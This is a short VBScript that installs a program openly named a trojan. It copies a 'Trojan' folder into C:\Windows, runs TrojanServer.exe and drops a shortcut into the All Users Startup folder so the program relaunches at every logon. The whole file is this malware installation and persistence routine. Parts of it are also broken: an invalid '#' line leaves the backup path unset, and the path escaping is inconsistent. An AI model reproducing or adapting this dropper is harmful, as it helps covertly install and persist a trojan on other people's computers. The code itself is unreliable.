Dim FSO,File
Dim Date,Hour,Day,Backuppath,Daystring
Set FSO = CreateObject("Scripting.FileSystemObject")
 
If Fso.FolderExists ("C:\\Windows\\Trojan") Then
   Set File= FSO.GetFile("C:\\Windows\Trojan\\TrojanServer.exe") 
   Date=File.DateLastModified
   Day=DatePart("y",Date)
   Daystring=CStr(Day)
   #Backuppath="C:\\Windows\\trojanbackup" + Daystring
   Fso.MoveFolder "C:\\Windows\\Trojan", Backuppath
End If
 
FSO.CopyFolder ".\Trojan", "C:\\Windows\\Trojan", true
 
Set oShell = CreateObject("WScript.Shell") 
oShell.Run "C:\Windows\\trojan\\TrojanServer.exe"
 
If Fso.FolderExists ("C:\\Documents and Settings\\All Users\\Start Menu\\Programs\\Startup\") Then
If Fso.FileExists ("C:\\Documents and Settings\\All Users\\Start Menu\\Programs\\Startup\\Trojan.lnk") Then
Else
   FSO.CopyFile "C:\\Windows\\Trojan\\Trojan.lnk", "C:\\Documents and Settings\\All Users\\Start Menu\\Programs\\Startup\\", true
End If
End If
 
wscript.quit